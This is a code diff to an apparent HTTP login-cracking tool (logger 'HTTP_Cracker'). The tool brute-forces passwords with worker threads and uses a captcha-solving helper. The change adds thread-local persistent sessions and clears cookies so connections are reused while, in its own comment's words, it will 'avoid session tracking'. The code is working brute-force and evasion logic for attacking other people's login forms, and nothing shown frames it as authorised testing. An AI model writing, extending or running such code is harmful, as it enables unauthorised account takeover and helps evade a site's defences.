@@ -1,5 +1,6 @@
 import logging
 import random
+import threading
 import time
 
 import requests
@@ -10,6 +11,9 @@ from src.utils.captcha import solve_captcha
 from src.utils.crypto import encrypt_aes, generate_headers
 
 logger = logging.getLogger("HTTP_Cracker")
+
+# Thread-local storage for persistent sessions
+thread_data = threading.local()
 
 # Constants
 MAX_RETRIES = 15  # Max attempts per password before giving up
@@ -86,7 +90,9 @@ def check_login(sess, username, password):
         return "ERROR"
 
 
-def worker(stop_event, progress_queue, username, password, day_prefix):
+def worker(
+    stop_event, progress_queue, username, password, day_prefix, persistent_session=False
+):
     """
     Thread worker to attempt one password.
     Loops internally for captcha retries and transient errors.
@@ -94,7 +100,14 @@ def worker(stop_event, progress_queue, username, password, day_prefix):
     if stop_event.is_set():
         return
 
-    sess = requests.Session()
+    if persistent_session:
+        if not hasattr(thread_data, "session"):
+            thread_data.session = requests.Session()
+        sess = thread_data.session
+        # Clear cookies to reuse TCP connection but avoid session tracking
+        sess.cookies.clear()
+    else:
+        sess = requests.Session()
 
     retry_count = 0
     consecutive_net_errors = 0
